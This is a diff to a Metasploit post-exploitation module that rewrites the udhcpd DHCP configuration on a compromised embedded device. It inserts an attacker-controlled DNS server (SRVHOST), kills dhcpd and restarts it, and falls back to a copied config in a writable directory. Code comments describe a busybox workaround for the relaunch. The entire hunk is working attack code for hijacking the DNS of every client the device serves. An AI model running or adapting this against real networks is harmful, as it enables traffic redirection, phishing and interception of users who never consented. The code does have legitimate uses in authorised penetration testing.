@@ -52,23 +52,24 @@ class Metasploit3 < Msf::Post
       original_content = read_file("/etc/udhcpd.conf")
       vprint_status("Original udhcpd.conf content:")
       vprint_status(original_content)
-      if is_writable_and_write("/etc/udhcpd.conf", "option dns #{datastore['SRVHOST']}", false)
-        vprint_status("Udhcpd.conf is writable.")
-        is_writable_and_write("/etc/udhcpd.conf", original_content, true)
-        vprint_status("Relaunching udhcp server:")
-        cmd_exec("killall dhcpd\n")
-        cmd_exec("dhcpd /etc/udhcpd.conf &\n")
+      if is_writable_and_write("/etc/udhcpd.conf", "option dns #{datastore['SRVHOST']}", true)
+        vprint_status("Udhcpd.conf is writable. Relaunching udhcp server:")
+        cmd_exec("killall dhcpd")
+        #in this case it is necessary to use shell_write. Cmd_exec introduce an echo after the command
+        #that is going to be executed: <command>;echo <rand_value>. It seems busybox fails to launch dhcpd
+        #process when it is executed in this way: "dhcpd /etc/udhcpd.conf &; echo <rand_value>"
+        session.shell_write("dhcpd /etc/udhcpd.conf &\n")
         print_good("Udhcpd.conf modified and dns server added. Dhcpd restarted.")
       else
         vprint_status("Unable to write udhcpd.conf. Trying to copy the file to a writable directory.")
         writable_directory = get_writable_directory()
         if writable_directory
           vprint_status("writable directory found, creating a copy of the original udhcpd.conf.")
-          is_writable_and_write("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", false)
-          is_writable_and_write("#{writable_directory}tmp.conf", original_content, true)
+          cmd_exec("cp -f /etc/udhcpd.conf #{writable_directory}tmp.conf"); Rex::sleep(0.3)
+          is_writable_and_write("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", true)
           vprint_status("Relaunching udhcp server:")
-          cmd_exec("killall dhcpd\n")
-          cmd_exec("dhcpd #{writable_directory}tmp.conf &\n")
+          cmd_exec("killall dhcpd")
+          session.shell_write("dhcpd #{writable_directory}tmp.conf &\n")
           print_good("Udhcpd.conf copied to writable directory and dns server added. Dhcpd restarted.")
           workdone = true
         else
